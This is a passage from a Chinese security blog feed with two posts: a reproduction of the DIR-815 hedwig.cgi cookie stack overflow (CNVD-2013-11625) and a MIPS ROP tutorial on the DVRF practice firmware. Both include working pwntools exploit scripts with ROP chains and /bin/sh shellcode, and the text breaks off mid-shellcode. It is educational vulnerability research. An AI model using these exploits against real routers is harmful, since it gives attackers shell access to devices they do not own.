    <content type="html"><![CDATA[<h1 id="dir-815-栈溢出漏洞复现"><a href="#dir-815-栈溢出漏洞复现" class="headerlink" title="dir-815 栈溢出漏洞复现"></a>dir-815 栈溢出漏洞复现</h1><p><strong>CNVD-2013-11625</strong>是Dir-815路由器在<code>hedwig.cgi</code>实现中会存在缓冲区溢出的漏洞。漏洞不正确过滤用户提交的参数数据，允许远程攻击者利用漏洞提交特制请求触发缓冲区溢出，可使应用程序停止响应，造成拒绝服务攻击。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h3><p>使用 <code>binwalk -Me DIR-815A1_FW101SSB03.bin</code>解压固件。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702120541796.png" alt="image-20230702120541796"></p><p>根据官方提示，漏洞存在于<code>hedwig.cgi</code>中，直接使用<code>find ./ -name &#39;*.cgi&#39; 2&gt;/dev/null</code>搜索。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702120855993.png" alt="image-20230702120855993"></p><p>事实上，该固件<strong>cgi</strong>都是实现在<code>/htdocs/cgibin</code>中的。我们对<code>cgibin</code>进行分析即可。</p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p>在IDA中打开，首先分析main函数。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702170228610.png" alt="image-20230702170228610"></p><p>可以看到，通过比较第一个参数是否为<code>hedwig.cig</code>，从而调用关键函数<code>hedwigcgi_main</code>函数。</p><h4 id="hedwigcgi"><a href="#hedwigcgi" class="headerlink" title="hedwigcgi"></a>hedwigcgi</h4><p>首先，获取环境变量<code>request_methed</code>。判断是否为POST请求，若不是，则直接失败返回。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702170521593.png" alt="image-20230702170521593"></p><p>接下来，会调用<code>cgibin_parse_request</code>函数进行解析。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702171704472.png" alt="image-20230702171704472"></p><h5 id="cgibin-parse-request"><a href="#cgibin-parse-request" class="headerlink" title="cgibin_parse_request"></a>cgibin_parse_request</h5><p>首先，获取环境变量<code>CONTENT_TYPE</code>与<code>CONTENT_LENGTH</code></p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702171818689.png" alt="image-20230702171818689"></p><p>之后，获取环境变量<code>REQUEST_URI</code>，并使用**?**对该参数进行分割，之后调用<code>sub_402b40</code>函数对后续进行分割。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702171947690.png" alt="image-20230702171947690"></p><h6 id="sub-402b40"><a href="#sub-402b40" class="headerlink" title="sub_402b40"></a>sub_402b40</h6><p>对后续参数继续进行分割。若遇到**&amp;<strong>，则递归调用<code>sub_402b40</code>继续分割参数；若遇到</strong>&#x3D;<strong>，就添加到变量v14中。也就是对</strong>URI**进行更细致的分割。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702172157179.png" alt="image-20230702172157179"></p><p>我们继续向下分析<code>cgibin_parse_request</code>函数。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702173021321.png" alt="image-20230702173021321"></p><p>获取环境变量<code>CONTENT_TYPE</code>，然后与**application&#x2F;**进行比较，之后调用数组<code>off_42c014</code>中的函数。该数组在data段，查看该数组内容。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702173400292.png" alt="image-20230702173400292"></p><p>大致就是，根据<code>CONTENT_TYPE</code>类型，调用不同的函数进行初始化。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702173625329.png" alt="image-20230702173625329"></p><p>这里也可以得到，我们的参数类型大致为 <code>CONTENT_TYPE/x-www-form-urlencoded</code>。</p><p>我们继续看<code>hedwigcgi</code>函数。</p><p>之后，会打开文件，并读入文件到v26中，貌似没什么用。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702173826847.png" alt="image-20230702173826847"></p><p>之后调用<code>sess_get_uid</code>函数，这个函数是溢出的一个关键函数。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702174015004.png" alt="image-20230702174015004"></p><p>若是<strong>string</strong>足够大，即可溢出v27[1024]数组了。</p><h5 id="sess-get-uid"><a href="#sess-get-uid" class="headerlink" title="sess_get_uid"></a>sess_get_uid</h5><p>首先，获取环境变量<code>HTTP_COOKIE</code>，然后对<strong>cookie</strong>进行处理。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702174139754.png" alt="image-20230702174139754"></p><p>逐个拆分获取<strong>cookie</strong>字段，直到获取<strong>uid</strong>字段，并返回该字段内容。注意，这个字段是我们可控的。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702174453733.png" alt="image-20230702174453733"></p><p>继续分析<code>hedwigcgi</code>函数。</p><p>我们需要绕过如下两个判断，其实这也不需要我们刻意绕过，正常机器下都是可以通过的。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702174814875.png" alt="image-20230702174814875"></p><p>之后，对上述**&#x2F;var&#x2F;tmp&#x2F;temp.xml**字段进行处理，这里也没有判断逻辑，就是顺序执行。若是真机，则不需要处理。否则，需要直接创建一个新的空白xml文件即可。</p><p>上述执行都未对v4进行处理，所以v4还是<strong>uid</strong>字段内容。这里就是真正的栈溢出。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702175120384.png" alt="image-20230702175120384"></p><p>至此，分析完毕。下面我们对该漏洞进行验证。</p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>对上述漏洞进行验证。验证脚本大致如下，这里我是直接参考<a href="https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_4">winmt师傅</a>的验证脚本，主要是太菜了。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702180154603.png" alt="image-20230702180154603"></p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702180735956.png" alt="image-20230702180735956"></p><p>可以看到，我们触发了一个段错误。但是为了避免是其他原因引起的，我们添加<code>-g 4321</code>进行动态调试。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702180916223.png" alt="image-20230702180916223"></p><p>这里我们确实覆盖了返回地址。且溢出长度为1009。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>路由器一般都是没有开启地址随机化的，我们可以直接获取到libc基地址，从而进行任意函数调用。</p><p>这里使用vmmap查看libc基址，可以看到为libc_base &#x3D; 0x7f738000。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702181649179.png" alt="image-20230702181649179"></p><p>接着，就是mips架构的栈溢出了。</p><p>若是对mips架构不太了解的，大致可以看看笔者之前的<a href="https://lst-oss.github.io/2023/02/04/CVE-2019-10999-Dlink%E6%91%84%E5%83%8F%E5%A4%B4%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">博客</a>。</p><p>mips架构的程序大都未开启NX保护，栈可以直接执行shellcode。mips架构的栈溢出一般都有一条稳定的rop链。大致是<code>sleep(1) + shellcode</code>。</p><p>这里rop链子的构造的原理可以参考笔者另一篇<a href="https://lst-oss.github.io/2023/07/02/mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/#Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0">博客</a>。</p><p>最终构造的wp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;mips&#x27;</span><br> <br>libc_base = <span class="hljs-number">0x7F738000</span><br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0x3cd</span>: &#123;<br>            <span class="hljs-number">0</span>: <span class="hljs-string">&#x27;aaaa&#x27;</span>,  <span class="hljs-comment"># s0</span><br>            <span class="hljs-number">0x4</span>: libc_base + <span class="hljs-number">0x436d0</span>,  <span class="hljs-comment"># s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span><br>            <span class="hljs-number">0xc</span>: libc_base + <span class="hljs-number">0x56BD0</span>,  <span class="hljs-comment"># s3  sleep</span><br>            <span class="hljs-number">0x24</span>: libc_base + <span class="hljs-number">0x57E50</span>,  <span class="hljs-comment"># ra  li $a0, 1 (=&gt; jalr $s1)</span><br>            <span class="hljs-number">0x28</span>: &#123;<br>                <span class="hljs-number">0x28</span>: libc_base + <span class="hljs-number">0x37E6C</span>,  <span class="hljs-comment"># s4  move  $t9, $a1 (=&gt; jalr $t9)</span><br>                <span class="hljs-number">0x2c</span>: libc_base + <span class="hljs-number">0x3B974</span>,  <span class="hljs-comment"># ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span><br>            &#125;<br>        &#125;<br>    &#125;, filler=<span class="hljs-string">&#x27;a&#x27;</span><br>)<br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += asm(shellcraft.sh())<br><br>payload = <span class="hljs-string">b&quot;uid=&quot;</span> + payload<br>p = process(<span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">    qemu-mipsel -L ./ \</span><br><span class="hljs-string">    -0 &quot;hedwig.cgi&quot; \</span><br><span class="hljs-string">    -E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="hljs-string">    -E CONTENT_LENGTH=11 \</span><br><span class="hljs-string">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="hljs-string">    -E HTTP_COOKIE=&quot;%s&quot; \</span><br><span class="hljs-string">    -E REQUEST_URI=&quot;2333&quot; \</span><br><span class="hljs-string">    ./htdocs/cgibin</span><br><span class="hljs-string">&quot;&quot;&quot;</span> % payload, shell = <span class="hljs-literal">True</span>)<br><br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-comment"># POST</span><br>content = <span class="hljs-string">&quot;test=l1s00t&quot;</span><br>p.send(content)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702232715503.png" alt="image-20230702232715503"></p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702231818526.png" alt="image-20230702231818526"></p><p>成功获取shell。</p><p>对上述payload做一个简单的解释。</p><ol><li>测试得到的offset&#x3D;1009，但是payload使用的offset&#x3D;0x3cd？</li></ol><p>我们的目的不是仅仅覆盖$ra，包括其他$s?参数，以便于我们更好的控制程序执行流程</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702231950195.png" alt="image-20230702231950195"></p><ol start="2"><li>第二段payload是从0x28开始的，其目的在于控制$ra与$r4寄存器，以便在<code>sleep(1)</code>执行后依然可以控制程序流程。</li></ol><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702232444887.png" alt="image-20230702232444887"></p><p><strong>参考文章</strong></p><p><a href="https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_4">https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_4</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mips栈溢出常见ROP构造</title>
    <link href="/2023/07/02/mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/"/>
    <url>/2023/07/02/mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="Mips栈溢出常见ROP构造"><a href="#Mips栈溢出常见ROP构造" class="headerlink" title="Mips栈溢出常见ROP构造"></a>Mips栈溢出常见ROP构造</h1><p>参考大佬的博客，在 GitHub 上找到了一个较好的靶机，适合新手来练手。</p><p>其地址为：<a href="https://github.com/praetorian-inc/DVRF">https://github.com/praetorian-inc/DVRF</a></p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>使用 <code>binwalk</code>提取固件系统。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">binwalk -Me ./DVRF_v03.<span class="hljs-built_in">bin</span><br></code></pre></td></tr></table></figure><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/1.png" alt="img"></p><p>进入固件系统，我们在 pwnable 目录下可以看到两个目录，分别保存着 mips 架构下有漏洞的程序。接下来我们将对其进行分析。</p><p>由于我们的系统是 x86 架构下的，无法直接启动。所以我们使用 qemu 启动， -L 指定根目录。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cp</span> <span class="hljs-variable">$</span>(which qemu<span class="hljs-literal">-mipsel-static</span>) .<br>./qemu<span class="hljs-literal">-mipsel-static</span> <span class="hljs-literal">-L</span> ./ ./pwnable/ShellCode_Required/stack_bof_02<br></code></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="stack-bof-02"><a href="#stack-bof-02" class="headerlink" title="stack_bof_02"></a>stack_bof_02</h3><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>首先，我们将程序拖入 IDA 中查看。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/2.png" alt="img"></p><p>很明显，程序存在栈溢出漏洞。</p><h4 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h4><p>我们使用 gdb 动态调试确定偏移量。当然，这里可以在 IDA 中直接查看，但是 IDA 分析出的不一定对，建议使用 gdb 确定。</p><p>使用 cyclic 生成 600 bytes，并输入到 test 文件中。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/3.png" alt="img"></p><p>输入以下命令运行程序，-g 指定远程调试端口。然后直接使用 gdb 连就可以了。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">./qemu<span class="hljs-literal">-mipsel-static</span> <span class="hljs-literal">-L</span> ./ <span class="hljs-literal">-g</span> <span class="hljs-number">1234</span> ./pwnable/ShellCode_Required/stack_bof_02 `cat test`<br></code></pre></td></tr></table></figure><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/4.png" alt="img"></p><p>可以确定，从输入到返回地址偏移量为 508 。</p><p>接下来就是 ROP 链的构造了。我们重点关注<strong>ROP 链的构造以及 sleep(1) 的用法。</strong></p><p>对于mips架构的程序而言，我们可以使用 <code>ropper</code>或者 <code>mipsrop</code>查找。我们一般可以两者结合使用。</p><h4 id="布置ROP"><a href="#布置ROP" class="headerlink" title="布置ROP"></a>布置ROP</h4><p>首先，调用前需要传递参数。我们可使用 mipsrop 寻找 <code>li $a0, 1</code>这类的 gadget 传递参数。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/5.png" alt="img"></p><p>我们使用 0x2fb10 这个gadget。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/6.png" alt="img"></p><p>这个 gadget 跳转到 $1 的位置，所以我们还需要找到可以控制 $s1 的 gadget。参考 <a href="https://www.anquanke.com/post/id/172126">这里</a> ，我们可以在 <code>scandir</code>函数中找到一段近乎通用的 gadget，可以很方便的控制参数。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/7.png" alt="img"></p><p>到了这里，我们基于可以构造出 sleep(1) 了。我们使用以下脚本构造，并尝试输入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p32<br><br>context.endian = <span class="hljs-string">&#x27;little&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;mips&#x27;</span><br><br>libc_base = <span class="hljs-number">0x7f6e5000</span><br>mysleep = libc_base + <span class="hljs-number">0x2f2b0</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x1fc</span><br>payload += p32(libc_base + <span class="hljs-number">0x0000Afe0</span>)<br><br>payload += <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x18</span><span class="hljs-comment"># sp offset</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s0</span><br>payload += p32(mysleep)<span class="hljs-comment"># s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s2</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s4</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s5</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s6</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s7</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># fp</span><br>payload += p32(libc_base + <span class="hljs-number">0x2FB10</span>)      <span class="hljs-comment"># ra</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(payload)<br></code></pre></td></tr></table></figure><p>我们通过调试查看是否成功调用 sleep(1).</p><p>可以看到，我们成功执行了 sleep 。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/8.png" alt="img"></p><p>但是，寄存器 $ra ，即返回地址不受控制，所以我们需要找到既可以调用函数又可以控制 $ra 寄存器的 gadget。这里我们的需求是可以使用 $sn 控制 $t9 的 gadget 。因为我们在上述 scandir 的gadget中可以控制 $sn 。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/9.png" alt="img"></p><p>我们挨个查看，并最终找到 0x21c34 这个 gadget 。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/10.png" alt="img"></p><p>这里我们可以通过 $s3 调用 sleep ，同时，可以通过 $ra 返回到下一段 gadget。</p><p>此时，脚本如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p32<br><br>context.endian = <span class="hljs-string">&#x27;little&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;mips&#x27;</span><br><br>libc_base = <span class="hljs-number">0x7f6e5000</span><br>mysleep = libc_base + <span class="hljs-number">0x2f2b0</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x1fc</span><br>payload += p32(libc_base + <span class="hljs-number">0xAfe0</span>)<br><br>payload += <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x18</span><span class="hljs-comment"># sp offset</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s0</span><br>payload += p32(libc_base + <span class="hljs-number">0x21c34</span>)<span class="hljs-comment"># s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s2</span><br>payload += p32(mysleep)<span class="hljs-comment"># s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s4</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s5</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s6</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s7</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># fp</span><br>payload += p32(libc_base + <span class="hljs-number">0x2FB10</span>)      <span class="hljs-comment"># ra</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(payload)<br></code></pre></td></tr></table></figure><p>执行，查看寄存器及堆栈。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/11.png" alt="img"></p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/12.png" alt="img"></p><p>我们成功执行了 sleep ，并且可以得知返回地址位于 $sp + 0x2c 的位置。接下来我们在此位置上布置 shellcode。继续查找合适的 gadget 。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/13.png" alt="img"></p><p>并发现 0x171cc 这个 gadget 。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/14.png" alt="img"></p><p>这里通过栈向 $a0 寄存器传入数据，若我们可以跳转到 $a0 寄存器，便可以执行我们的 shellcode 。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/15.png" alt="img"></p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/16.png" alt="img"></p><p>最终 wp 如下。其中，shellcode 摘抄自<a href="http://shell-storm.org/shellcode/files/shellcode-792.php">这里</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p32<br><br>context.endian = <span class="hljs-string">&#x27;little&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;mips&#x27;</span><br><br>libc_base = <span class="hljs-number">0x7f6e5000</span><br>mysleep = libc_base + <span class="hljs-number">0x2f2b0</span><br><br>shellcode = <span class="hljs-string">b&#x27;&#x27;</span><br>shellcode += <span class="hljs-string">b&quot;\xff\xff\x06\x28&quot;</span>  <span class="hljs-comment"># slti $a2, $zero, -1</span><br>shellcode += <span class="hljs-string">b&quot;\xff\xff\x06\x28&quot;</span>  <span class="hljs-comment"># slti $a2, $zero, -1</span><br>shellcode += <span class="hljs-string">b&quot;\x62\x69\x0f\x3c&quot;</span>  <span class="hljs-comment"># lui $t7, 0x6962</span><br>shellcode += <span class="hljs-string">b&quot;\x2f\x2f\xef\x35&quot;</span>  <span class="hljs-comment"># ori $t7, $t7, 0x2f2f</span><br>shellcode += <span class="hljs-string">b&quot;\xf4\xff\xaf\xaf&quot;</span>  <span class="hljs-comment"># sw $t7, -0xc($sp)</span><br>shellcode += <span class="hljs-string">b&quot;\x73\x68\x0e\x3c&quot;</span>  <span class="hljs-comment"># lui $t6, 0x6873</span><br>shellcode += <span class="hljs-string">b&quot;\x6e\x2f\xce\x35&quot;</span>  <span class="hljs-comment"># ori $t6, $t6, 0x2f6e</span><br>shellcode += <span class="hljs-string">b&quot;\xf8\xff\xae\xaf&quot;</span>  <span class="hljs-comment"># sw $t6, -8($sp)</span><br>shellcode += <span class="hljs-string">b&quot;\xfc\xff\xa0\xaf&quot;</span>  <span class="hljs-comment"># sw 